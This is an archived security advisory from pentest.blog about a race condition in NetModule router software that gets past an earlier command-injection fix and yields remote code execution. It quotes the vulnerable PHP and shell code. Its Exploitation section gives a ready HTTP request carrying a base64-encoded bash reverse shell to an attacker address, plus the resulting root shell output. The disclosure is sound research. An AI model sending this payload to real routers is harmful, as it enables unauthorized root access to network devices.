---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-09_advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution.md
original_filename: 2023-08-09_advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution.md
title: Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution
category: documents
detected_topics:
- command-injection
- race-condition
- api-security
- cloud-security
tags:
- imported
- documents
- command-injection
- race-condition
- api-security
- cloud-security
language: en
raw_sha256: c049578029d907e7e0ef3533b69304bca63ff6587b40501ac9752053505483fa
text_sha256: f7684483fcdd33a1d54e4f6856fda1a520b9edcfbe4772cd9d98a67d2c3d063e
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-09_advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, race-condition, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `c049578029d907e7e0ef3533b69304bca63ff6587b40501ac9752053505483fa`
- Text SHA256: `f7684483fcdd33a1d54e4f6856fda1a520b9edcfbe4772cd9d98a67d2c3d063e`


## Content

---
title: "Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution"
page_title: "Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution – Pentest Blog"
url: "https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/"
final_url: "https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/"
authors: ["Nuri Çilengir"]
programs: ["NetModule"]
bugs: ["Race condition", "Security code review"]
publication_date: "2023-08-09"
added_date: "2023-08-21"
source: "pentester.land/writeups.json"
original_index: 868
---

![](https://pentest.blog/wp-content/uploads/netmodule.jpg)

# Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution

__[ August 9, 2023August 21, 2023](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/) __[Nuri Çilengir](https://pentest.blog/author/nuri-cilengir/) __[Advisories](https://pentest.blog/category/advisories/)

## Introduction

NetModule Router Software (NRSW) is a Linux-based software solution developed by NetModule for managing data connections across various devices. It applies to a various devices, including stationary and mobile routers, gateways, and IoT devices. NRSW provides consistent configuration processes and functions across all NetModule devices. It includes security features and supports over-the-air updates. NetModule also provides free updates and support for NRSW, contributing to its overall functionality and efficiency in network operations.

## **Advisory Informations**

**Remotely Exploitable:** Yes  
**Authentication Required:** Yes  
**Vendor URL:** [www.netmodule.com](http://www.netmodule.com)  
**CVSSv3.1 Score:** AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (8.4)  
**Date of found:** 14.07.2023  
**Affected Vendor & Products**: NetModule NB1601, NB1800, NB1810, NB2800, NB2810, NB3701, NB3800, NB800, NG800  
**Vulnerable version:** < 4.6.0.105, < 4.7.0.103

## Technical Details

The technical articles we publish on pentest.blog are typically shaped by the emphasis we place on information sharing and our efforts to convey the ‘hacker’ perspective in addition to technical knowledge. Therefore, I aim to share all the steps I’ve followed until reaching the zero-day in this advisory. The technical details you will see below describe perhaps the vulnerability I discovered with the least effort to date.

Somehow, the NetModule Router Software and Firmware made it to my review list. I downloaded the ISO files and parsed the source code. Subsequently, I began reviewing the User Manual and other sources related to the firmware. I believe that reviewing user manuals is one of the quickest ways to reach a vulnerability. Because no matter what the product, environment, or technology is, it usually directly conveys the work done, data, and workflows.

## Exploring the Project’s Insights: Analyzing Past Vulnerabilities – [_CVE-2023-0861_](https://www.cve.org/cverecord?id=CVE-2023-0861)

Before starting static code analysis, we usually review previously identified security vulnerabilities and the prevention taken against these issues. This will help anticipate potential challenges and restrictions. In this regard, when I reviewed the advisory blog post published by [ONEKEY](https://onekey.com/blog/security-advisory-netmodule-multiple-vulnerabilities/) earlier, I came across the piece of code you will see below.

It checks whether there is a process related to the device id received from the user. If the process exists and its status is not ‘disabled’, the code block between lines 14 and 18 can be executed. In a previously identified vulnerability, it can be clearly seen that direct code execution is possible.
  
  
  <?php
  require_once('config/config.php');
  if (isset($c))
  $device_id = $c;
  else
  $device_id = $_REQUEST['device_id'];
  
  $status = "disabled";
  
  define("STATUS_FILENAME", "/tmp/status/gnss" . $device_id . "/dr-auto-align");
  define("ANGLES_FILENAME", "/tmp/status/gnss" . $device_id . "/dr-auto-align-angles");
  define("PID_FILENAME", "/run/gnss" . $device_id . "/dr-auto-align.pid");
  
  if (file_exists(STATUS_FILENAME)) {
  $statusfile = fopen(STATUS_FILENAME, "r");
  $status = fread($statusfile, filesize(STATUS_FILENAME));
  fclose($statusfile);
  }
  
  // ...
  //  Other code lines
  // ...
  
  if (isset($_POST['toggleAlignment'])) {
  if ($status == "disabled") {
  -  exec("/usr/local/sbin/www-scripts/various/doAutoAlignment " . $device_id . " > /dev/null &");
  +  exec("/usr/local/sbin/www-scripts/various/doAutoAlignment " . escapeshellarg($device_id) . " > /dev/null &");
  $status = "starting";
  } else {
  exec("kill $(cat " . PID_FILENAME . ")");
  $status = "stopping";
  }
  }
  ...

Upon first glance, the prevention taken against command injection vulnerability seems reasonable. However, did anything catch your attention when you looked at the code a second time?

## Race Condition: Thinking as Threads

In the code block above, despite the precautions taken, the point that draws attention is the `exec("kill $(cat " . PID_FILENAME . ")");` statement on the 30th line. However, we need to check the file that stores the process state. If we can manipulate the file that contains the process state in some way, we can reach the line that allows us to kill the running process by creating a new thread when it’s not in a disabled state.

In this context, I started to examine in which states the process statuses changed in the file, and discovered the doAutoAlignment script file. doAutoAlignment performs a series of operations on the device with the parameters it gets from the application. During these operations, it checks and writes the process and status information related to the device to files.
  
  
  #!/usr/bin/env ash
  
  if [ -z "$1" ]; then
  echo "Invalid GNSS id"
  exit 1
  fi
  
  GNSS_ID="$1"
  WWANMD_ID="1$GNSS_ID"
  STATUS_FILE="/tmp/status/gnss$GNSS_ID/dr-auto-align"
  ANGLES_FILE="/tmp/status/gnss$GNSS_ID/dr-auto-align-angles"
  PID_FILE="/run/gnss$GNSS_ID/dr-auto-align.pid"
  
  alignment() {
  wwan-cmd -c dr-auto-align "$WWANMD_ID" "$1"
  }
  
  set_status() {
  echo "$1" > "$STATUS_FILE"
  }
  
  cleanup() {
  alignment stop
  rm -f "$STATUS_FILE"
  rm -f "$ANGLES_FILE"
  rm -f "$PID_FILE"
  exit
  }
  
  if [ -f "$PID_FILE" ]; then
  pid=$(cat $PID_FILE)
  if [ -e /proc/$pid ]; then
  echo "Auto alignment already running"
  exit 2
  fi
  echo "Previous auto-alignment did not stop properly"
  rm "$PID_FILE"
  fi
  
  mkdir -p "$(dirname "$STATUS_FILE")"
  mkdir -p "$(dirname "$ANGLES_FILE")"
  mkdir -p "$(dirname "$PID_FILE")"
  
  trap cleanup EXIT INT TERM
  echo $$ > "$PID_FILE"
  
  echo "Starting auto-alignment"
  alignment start || exit 1
  set_status "starting"
  status=$(alignment read)
  while echo "$status" | grep "^user-defined" > /dev/null; do
  status=$(alignment read)
  done

Between lines 30 and 38 of the above doAutoAlignment script, the device’s process control is carried out. If the process exists and is not faulty, a new process is created, and its state is set as “starting”. However, as seen on line 44, the `trap` is used to run the `cleanup` function in any `EXIT`, `INTERRUPT`, or `TERMINATE` situation throughout the script.

At this point, the situation we need to think about is this; if we start another thread at the stage where the process is created, that is, in the starting state, before the `trap` triggers the cleanup function, we skip the background status control conditionally. Bingo!
  
  
  Thread 1:
  define device_id from payload
  send HTTP request to gnssAutoAlign with device_id
  
  if process_file does not exist at gnssAutoAlign:
  set status to "disabled"
  
  if status is "disabled" and toggleAlignment is set:
  send device_id to doAutoAlignment for process creation
  
  In doAutoAlignment:
  if process does not exist or is not erroneous:
  create a new process
  set status to "starting"
  
  on EXIT, INTERRUPT or TERMINATE signals:
  run cleanup function

How will a second request sent to the system behave while Thread 1 has just started? The resource we are trying to use simultaneously here is the file containing the status of the related process. If we can read the software process written on the disk with the “starting” label before it gives an error (since the alignment function will give an error for a given payload), we can meet the condition of killing the process containing the payload.
  
  
  Thread 2:
  define device_id from payload
  send HTTP request to gnssAutoAlign with device_id
  
  check for existence of process file at gnssAutoAlign
  
  if process_file exists:
  read status from process file
  
  if toggleAlignment is set and status is "disabled":
  execute command "exec("kill $(cat " . PAYLOADED FILENAME . ")")"

## Exploitation

Below, you see a prepared HTTP request, ready to be sent sequentially to the server, in order to exploit vulnerability.
  
  
  POST /admin/gnssAutoAlign.php HTTP/1.1
  Host: 192.168.56.124
  User-Agent: Mozilla/5.0 (X11; %s race1 x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9, image/avif,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  DNT: 1
  Connection: close
  Upgrade-Insecure-Requests: 1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 114
  
  device_id=1+$(echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvOTAwMSAwPiYx|base64+-d|bash)&toggleAlignment=1337

If the exploitation is successful, a reverse shell will be obtained as shown below.
  
  
  ~ » ncat - lvp 9001
  Ncat: Version 7.93 ( https: / /nmap.org/ncat )
  Ncat: Listening on :::9001
  Ncat: Listening on 0.0.0.0:9001
  Ncat: Connection from 192.168.56.124.
  Ncat: Connection from 192.168.56.124:60550.
  root@fenrir: /home/root /www-data# id
  uid=0 (root) gid=0(root) groups=0 (root)

## 

[0day](https://pentest.blog/tag/0day/) [advisory](https://pentest.blog/tag/advisory/)

![](https://secure.gravatar.com/avatar/59beb7b08851e4c22f88fe6903402a4c01063bcb23246029185c36392d887c8a?s=60&d=monsterid&r=g)

#### [Nuri Çilengir](https://pentest.blog/author/nuri-cilengir/)

Pentest Ninja at @prodaft
